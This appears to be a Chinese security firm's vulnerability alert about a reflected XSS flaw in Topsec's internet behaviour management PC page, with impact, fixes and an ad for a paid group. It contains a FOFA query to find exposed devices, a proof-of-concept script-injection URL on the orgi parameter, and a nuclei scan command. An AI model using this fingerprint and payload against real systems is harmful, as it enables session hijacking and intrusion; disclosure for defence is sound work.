#  漏洞预警｜天融信上网行为管理 PC 存在跨站脚本漏洞  
by 融云安全-sm
                    by 融云安全-sm  融云攻防实验室   2026-05-13 09:25  
  
# 📌 0x01 漏洞描述  
  
近期监测发现，天融信 上网行为管理系统 PC 存在跨站脚本漏洞（XSS）。  
  
攻击者可通过构造恶意参数，在页面中注入 JavaScript 代码，当用户访问恶意链接后，可能导致：  
  
▪️ Cookie 窃取  
  
▪️ 会话劫持  
  
▪️ 页面篡改  
  
▪️ 钓鱼跳转  
  
▪️ 后台权限进一步利用  
  
⚠️ 若后台管理员访问恶意链接，风险将进一步扩大。  
  
━━━━━━━━━━━━━━━━━━  
# 🌐 0x02 FOFA 语法  
```
body="ActiveXObject" && body="dkey_login" && body="repeat-x"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RQ1ibJdI2zrg4T0oG9UcRcr00uO5PRTX36TsnC76Xicz37bdLxY9jWoBS00icwXGoI6YuOQ5cuxPcMW3Nny14nOzHhomDuQbsHXLcp95dfoGf4/640?wx_fmt=png&from=appmsg "")  
  
━━━━━━━━━━━━━━━━━━  
# 💥 0x03 漏洞复现  
```
/smsauth/adverdeclare/pc.php?orgi=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
```  
  
若页面成功弹出：  
```
alert(1)
```  
  
则说明目标存在漏洞风险。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RQ1ibJdI2zriaKD3QIxWD7HHyydM9Wa6GFBiavVibQ6PzO3SfA1AvRxIcvcib7QzD2C95vJSpUMIKSM0ib1VsGRrpQKtibPnVZQPibKw5OoFIKrSiclY/640?wx_fmt=png&from=appmsg "")  
  
━━━━━━━━━━━━━━━━━━  
# 🧪 nuclei 验证  
  
nuclei 验证脚本已发布至知识星球。  
```
nuclei -t topsec-acm-pc-xss.yaml -u http://target.com
```  
  
━━━━━━━━━━━━━━━━━━  
# ⚠️ 0x04 漏洞影响  
  
攻击者可能利用该漏洞实现：  
  
▪️ 获取用户 Cookie 信息  
  
▪️ 劫持管理员会话  
  
▪️ 页面恶意跳转  
  
▪️ 钓鱼攻击  
  
▪️ 配合其他漏洞进一步渗透内网  
  
━━━━━━━━━━━━━━━━━━  
# 🛡️ 0x05 修复建议  
  
✅ 升级至官方最新安全版本  
  
✅ 对用户输入进行过滤与转义  
  
✅ 配置 WAF/XSS 防护策略  
  
✅ 禁止后台系统直接暴露互联网  
  
✅ 排查异常访问日志  
  
✅ 定期开展漏洞扫描与安全巡检  
  
**网络安全神兵利器分享**  
  
**网络安全漏洞N/0day分享**  
  
**加入星球请扫描下方二维码，更多精，敬请期待！**  
  
👇👇👇  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/GWXBjgPE49zs4eNkNzwGvylxKjRnH2aibQqdbEUPicwHRpyuIhk7YdcECWw9kZGCibot3aRDzS4ADTmywx57c7QBw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**0x04 公司简介**  
  
江西渝融云安全科技有限公司，2017年发展至今，已成为了一家集云安全、物联网安全、数据安全、等保建设、风险评估、信息技术应用创新及网络安全人才培训为一体的本地化高科技公司，是江西省信息安全产业链企业和江西省政府部门重点行业网络安全事件应急响应队伍成员。  
    公司现已获得信息安全集成三级、信息系统安全运维三级、风险评估三级等多项资质认证，拥有软件著作权十八项；荣获2020年全国工控安全深度行安全攻防对抗赛三等奖；庆祝建党100周年活动信息安全应急保障优秀案例等荣誉......  
  
**编制：sm**  
  
**审核：fjh**  
  
**审核：Dog**  
  
  
**1个1朵****5毛钱**  
  
**天天搬砖的小M**  
  
**能不能吃顿好的**  
  
**就看你们的啦**  
  
****  
